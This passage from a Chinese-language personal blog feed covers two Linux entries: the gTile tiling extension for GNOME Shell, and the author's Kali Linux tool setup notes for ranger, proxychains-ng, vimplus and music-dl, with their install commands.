    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong>这是Gnome-Shell的一个扩展插件，由于Gnome桌面的平铺方案最多只能两个窗口，对于大屏幕显示器来说是不够用的，而gTile可以解决这个问题。</strong></p><p><strong>gTile拥有多个内置平铺方案，可平铺多个窗口，增加工作效率。可自行配置快捷键唤醒gTile进行平铺</strong></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="Gnome-Extensions-Install"><a href="#Gnome-Extensions-Install" class="headerlink" title="Gnome Extensions Install"></a>Gnome Extensions Install</h2><p><strong>先安装Gnome-Shell再安装扩展</strong> <a href="https://extensions.gnome.org/extension/28/gtile/">gTile-Gnome-Shell</a><br><img src="/images/gtile-1.png"></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>打开扩展方式：Gnome Tweak Tools(优化) –&gt; Extensions(扩展) –&gt; Gtile(点击开启按钮)</p><p>点击设置按钮进入配置界面，点击(Accelerators)选项可配置快捷键，唤醒gTile的快捷键为<code>Super+Enter</code>。更多快捷键请自行探索。<br><img src="/images/gtile-2.png"></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><ol><li><code>Super+Enter</code>唤醒gTile <img src="/images/gtile-3.png"></li><li>按下键盘数字键0～9使用预设方案<code>Super+Enter+3</code> <img src="/images/gtile-4.png"></li></ol><p>还有更多预设方案可多个窗口平铺<br><img src="/images/gtile-5.png"><br><img src="/images/gtile-6.png"><br><img src="/images/gtile-7.png"></p><p>GitHub gTile:<a href="https://github.com/gtile/gtile">Gtile项目地址</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;这是Gnome-Shell的一个扩展插件，由于Gnome桌面的平铺方案最多只能两个窗口，对于大屏幕显示器来说是不够用的，而g</summary>
      
    
    
    
    <category term="Linux" scheme="https://whoiszkuan.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://whoiszkuan.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>About My LInux</title>
    <link href="https://whoiszkuan.github.io/2021/08/12/About%20My%20LInux/"/>
    <id>https://whoiszkuan.github.io/2021/08/12/About%20My%20LInux/</id>
    <published>2021-08-12T04:02:39.000Z</published>
    <updated>2022-01-24T05:32:19.280Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简言"><a href="#简言" class="headerlink" title="简言"></a>简言</h1><p>由于平时比较喜欢折腾Linux，经常会把系统反复安装，许多原先配置好的东西都忘记了,所以打算写一篇来记录一下自己平时配置的文件操作。<br><strong>注：本人使用的Linux系统为Kali Linux</strong></p><h2 id="ranger"><a href="#ranger" class="headerlink" title="ranger"></a>ranger</h2><p>ranger是一款命令行文件资源管理器，提供多级视图，方便操作</p><blockquote><p>sudo apt install ranger</p></blockquote><p>启动命令：<code>ranger</code><br><img src="/images/ranger.png"></p><h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><p>proxychains是一款命令行代理工具，可将当前应用的TCP转发至代理，非全局代理。<br>目前支持Tor,HTTP,Socks代理。</p><blockquote><p>git clone <a href="https://github.com/rofl0r/proxychains-ng">https://github.com/rofl0r/proxychains-ng</a><br>cd proxychains-ng<br>./configure<br>sudo make &amp;&amp; make install</p></blockquote><p>代理配置文件位置：<code>/etc/proxychains.conf</code><br>启动命令：<code>proxychains4 &lt;启动应用&gt;</code></p><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><p>相比Linux下的程序员都知道Vim，由于自己平时比较懒，不想学Vim的语法，所以Vim并没有自己配置，而是使用了<code>Vim-Plus</code>，即开即用。</p><blockquote><p>git clone <a href="https://github.com/chxuan/vimplus.git">https://github.com/chxuan/vimplus.git</a> ~/.vimplus<br>cd ~/.vimplus<br>./install.sh</p></blockquote><p><img src="/images/vim.png"><br>Vim的主题被我注释掉了，使用的主题是Terminal自带的Kali-Dark主题配色。</p><h2 id="music-dl"><a href="#music-dl" class="headerlink" title="music-dl"></a>music-dl</h2><p>music-dl是一款基于Python3的命令行网络音乐聚合搜索下载工具。</p><p>使用pip3安装，前提需要安装pip3：<code>sudo apt install pip3</code><br>安装music-dl:<code>sudo pip3 install pymusic-dl</code></p><p><img src="/images/music-dl.png"></p><blockquote><p>$ music-dl –help<br>Usage: music-dl [OPTIONS]</p><p> Search and download music from netease, qq, kugou, baidu and xiami.<br>  Example: music-dl -k “周杰伦”</p><p>Options:<br>  –version             Show the version and exit.<br>  -k, –keyword TEXT    搜索关键字，歌名和歌手同时输入可以提高匹配（如 空帆船 朴树）<br>  -u, –url TEXT        通过指定的歌曲URL下载音乐<br>  -p, –playlist TEXT   通过指定的歌单URL下载音乐<br>  -s, –source TEXT     Supported music source: qq netease kugou baidu<br>  -n, –number INTEGER  Number of search results<br>  -o, –outdir TEXT     Output directory<br>  -x, –proxy TEXT      Proxy (e.g. <a href="http://127.0.0.1:1087/">http://127.0.0.1:1087</a>)<br>  -v, –verbose         Verbose mode<br>  –lyrics              同时下载歌词<br>  –cover               同时下载封面<br>  –nomerge             不对搜索结果列表排序和去重<br>  –help                Show this message and exit.</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简言&quot;&gt;&lt;a href=&quot;#简言&quot; class=&quot;headerlink&quot; title=&quot;简言&quot;&gt;&lt;/a&gt;简言&lt;/h1&gt;&lt;p&gt;由于平时比较喜欢折腾Linux，经常会把系统反复安装，许多原先配置好的东西都忘记了,所以打算写一篇来记录一下自己平时配置的文件操作。&lt;br&gt;</summary>
      
    
    
    
    <category term="Linux" scheme="https://whoiszkuan.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://whoiszkuan.github.io/tags/Linux/"/>
    
  </entry>
  
</feed>
